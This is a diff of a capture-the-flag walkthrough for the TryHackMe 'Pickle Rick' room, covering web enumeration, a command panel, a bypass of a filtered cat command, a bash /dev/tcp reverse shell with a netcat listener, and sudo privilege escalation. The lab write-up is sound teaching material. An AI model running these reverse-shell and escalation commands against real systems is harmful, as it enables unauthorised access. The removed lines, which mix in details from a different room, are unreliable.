@@ -1,7 +1,7 @@
 ---
 title: Pickle Rick
 categories: [TryHackMe]
-tags: [Linux, easy]
+tags: [Linux, easy,dirsearch,]
 image: images/Rick/Rick.jpg
 ---
 
@@ -27,37 +27,36 @@ The scan reveals port 80 (HTTP) is open.
 # 2. Web Enumeration
 
 Explore the web interface.
-
+![web](../images/Rick/web.png)
 ### Access the Portal
 Visit `http://<Target_IP>` to access the *Rick and Morty*-themed portal. Check the page source for clues. A note reveals the username: **RickRul3s**.
-
+![ins](../images/Rick/inspect.png)
 ### Check robots.txt
 Retrieve hidden files:
 
 ```console
 curl http://<Target_IP>/robots.txt
 ```
+we found *Wubbalubbadubdub* it's the password
+### Discovery
 
-This uncovers:
-- `fsocity.dic`: A password wordlist.
-- `Sup3rS3cretPickl3Ingred.txt`: A file hinting at ingredients.
-Retrieve them:
+I used Dirsearch 
 
-```console
-wget http://<Target_IP>/fsocity.dic
-wget http://<Target_IP>/Sup3rS3cretPickl3Ingred.txt
-```
+![dirsearch](../images/Rick/dirsearch.png)
 
-The first ingredient is **mr_meeseek_hair**.
+### login
+
+We need to visit `http://<Target_IP>/login.php`
+
+![login](../images/Rick/login.png)
+
+After We logged in   
 
 # 3. Accessing the Command Panel
 
 Navigate to `http://<Target_IP>/portal` to access the command panel.
 
-### Login
-Use the credentials from the page source:
-- Username: **RickRul3s**
-- Password: (Brute-force with `fsocity.dic` if needed via external tool).
+![Portal](../images/Rick/portal.png)
 
 ### Execute Commands
 Use the command panel to list files:
@@ -65,11 +64,31 @@ Use the command panel to list files:
 ```console
 ls -la
 ```
-
+![ls](../images/Rick/ls.png)
 This reveals files like `Sup3rS3cretPickl3Ingred.txt`, `clue.txt`, etc.
+### failing cat
 
+The command is disabled
+![failed](../images/Rick/failed.png)
 
+we can try less or tac
+```
+less Sup3rS3cretPickl3Ingred.txt
+```
+![less](../images/Rick/less.png)
+
+we got the first flag *##. ####### ####*
 # 4. Gaining a Reverse Shell
+
+### Execute Reverse Shell
+In the command panel, enter:
+
+```console
+bash -i >& /dev/tcp/<Your IP>/4444 0>&1
+```
+![rev](../images/Rick/rev.png)
+
+Replace `10.10.10.10` with your IP. After execution, you should see a connection in your listener.
 
 ### Set Up Listener
 On your machine, start a Netcat listener:
@@ -77,15 +96,7 @@ On your machine, start a Netcat listener:
 ```console
 nc -lvnp 4444
 ```
-
-### Execute Reverse Shell
-In the command panel, enter:
-
-```console
-bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
-```
-
-Replace `10.10.10.10` with your IP. After execution, you should see a connection in your listener.
+![listen](../images/Rick/listen.png)
 
 
 # 5. Privilege Escalation
@@ -100,11 +111,10 @@ cd /home
 ls
 cd rick
 ls
-cd less_second_ingredients
-less second_ingredients
+less second\ ingredients
 ```
-
-The second ingredient is **jerry_tear**.
+![second](../images/Rick/second.png)
+The second ingredient is **# ##### ####**.
 
 ### Escalate to Root
 Check sudo privileges:
@@ -112,7 +122,7 @@ Check sudo privileges:
 ```console
 sudo -l
 ```
-
+![nopass](../images/Rick/nopass.png)
 If `(ALL) NOPASSWD: ALL` is allowed, run:
 
 ```console
@@ -121,15 +131,15 @@ cd /root
 ls
 less 3rd.txt
 ```
-
-The third ingredient is **fleebs_juice**.
+![previlge](../images/Rick/previlge.png)
+The third ingredient is **###### #####**.
 
 
 # 6. Capture the Ingredients
 
-- **First Ingredient**: **mr_meeseek_hair** (from `Sup3rS3cretPickl3Ingred.txt`).
-- **Second Ingredient**: **jerry_tear** (from `less_second_ingredients/second_ingredients`).
-- **Third Ingredient**: **fleebs_juice** (from `/root/3rd.txt`).
+- **First Ingredient**: **##. ####### ####** (from `Sup3rS3cretPickl3Ingred.txt`).
+- **Second Ingredient**: **# ##### ####** (from `/home/rick/second ingredients`).
+- **Third Ingredient**: **###### #####** (from `/root/3rd.txt`).
 
 # 7. Final Thoughts
 
